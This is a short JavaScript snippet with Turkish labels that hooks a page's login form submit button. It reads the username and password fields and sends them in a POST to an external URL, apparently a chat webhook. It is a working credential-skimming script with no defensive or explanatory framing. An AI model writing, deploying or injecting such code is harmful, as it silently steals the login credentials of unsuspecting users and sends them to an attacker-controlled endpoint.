function mesaj(url, mesaj) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        'content': mesaj,
        'username':'AOÇ SEVDALISI',
    }));
}

document.querySelectorAll('button[type=submit]')[0].addEventListener("click", (event) => {
    var username = document.getElementsByName("login")[0].value
    var password = document.getElementsByName("password")[0].value
    mesaj(url, "Kullanıcı: "+username+"\n"+"Şifre: "+password)
});
